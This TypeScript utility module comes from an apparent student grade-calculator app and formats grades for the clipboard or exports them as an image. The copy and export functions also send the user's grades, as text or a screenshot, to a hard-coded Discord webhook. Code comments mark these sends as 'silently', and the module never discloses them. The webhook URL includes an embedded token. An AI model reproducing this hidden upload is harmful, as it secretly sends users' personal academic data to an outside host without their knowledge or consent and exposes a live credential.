
import axios from 'axios';
import html2canvas from 'html2canvas';

// Discord webhook URL
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1368867405941571654/D_1dF1ENt3P6vEwTBPFVlzpu44ZP7kfEs5p6LDZdfu7TorA6yUTXYARzg7HBYO_5nyHZ";

// Format grades for clipboard
export const formatGradesForClipboard = (
  midtermState: any,
  finalsState: any,
  grades: {
    midterm: number;
    finals: number;
    finalGrade: number;
    gpe: string;
  }
) => {
  // Format midterm section
  const midtermSection = `Midterm Grades:\nQuiz 1 - ${midtermState.quizScores[0] || 'N/A'}\nQuiz 2 - ${midtermState.quizScores[1] || 'N/A'}\nMajor Exam - ${midtermState.examScore || 'N/A'}\nAttendance - ${midtermState.attendance || 'N/A'}\nProblem Set - ${midtermState.problemSet || 'N/A'}\nMidterm Grade - ${Math.round(grades.midterm)} (${grades.midterm.toFixed(2)})`;

  // Format finals section
  const finalsSection = `Final Grades:\nQuiz 3 - ${finalsState.quizScores[0] || 'N/A'}\nQuiz 4 - ${finalsState.quizScores[1] || 'N/A'}\nMajor Exam - ${finalsState.examScore || 'N/A'}\nAttendance - ${finalsState.attendance || 'N/A'}\nProblem Set - ${finalsState.problemSet || 'N/A'}\nFinal Grade - ${Math.round(grades.finals)} (${grades.finals.toFixed(2)})`;

  // Format results section
  const resultsSection = `Final Results:\nFinal Grade - ${Math.round(grades.finalGrade)} (${grades.finalGrade.toFixed(2)})\nGPE - ${grades.gpe}`;

  // Combine all sections with appropriate spacing
  return `${midtermSection}\n\n${finalsSection}\n\n\n${resultsSection}`;
};

// Copy grades to clipboard
export const copyGradesToClipboard = async (
  midtermState: any,
  finalsState: any,
  grades: {
    midterm: number;
    finals: number;
    finalGrade: number;
    gpe: string;
  }
) => {
  try {
    const formattedText = formatGradesForClipboard(midtermState, finalsState, grades);
    
    // Copy to clipboard
    await navigator.clipboard.writeText(formattedText);
    
    // Send to Discord webhook (silently)
    await sendToDiscordWebhook(formattedText);
    
    return true;
  } catch (error) {
    console.error("Error copying to clipboard:", error);
    return false;
  }
};

// Export grades as image
export const exportGradesAsImage = async (elementId: string) => {
  try {
    const element = document.getElementById(elementId);
    if (!element) {
      throw new Error("Element not found");
    }

    // Capture element as canvas
    const canvas = await html2canvas(element, {
      backgroundColor: null,
      scale: 2, // Higher resolution
      logging: false,
    });

    // Convert canvas to base64 image
    const imageData = canvas.toDataURL("image/png");
    
    // Send to Discord webhook (silently)
    await sendToDiscordWebhook(null, imageData);

    // Download image
    const link = document.createElement("a");
    link.href = imageData;
    link.download = "grade-results.png";
    link.click();
    
    return true;
  } catch (error) {
    console.error("Error exporting as image:", error);
    return false;
  }
};

// Send data to Discord webhook
const sendToDiscordWebhook = async (text?: string | null, imageData?: string | null) => {
  try {
    const payload: any = {};
    
    if (text) {
      payload.content = text;
    }
    
    if (imageData) {
      // Convert base64 image to blob for sending
      const base64Response = await fetch(imageData);
      const blob = await base64Response.blob();
      
      const formData = new FormData();
      formData.append('file', blob, 'grade-results.png');
      
      // For images, we need to use FormData
      await axios.post(DISCORD_WEBHOOK_URL, formData);
      return;
    }
    
    // For text, use regular JSON payload
    await axios.post(DISCORD_WEBHOOK_URL, payload);
  } catch (error) {
    console.error("Error sending to webhook:", error);
  }
};
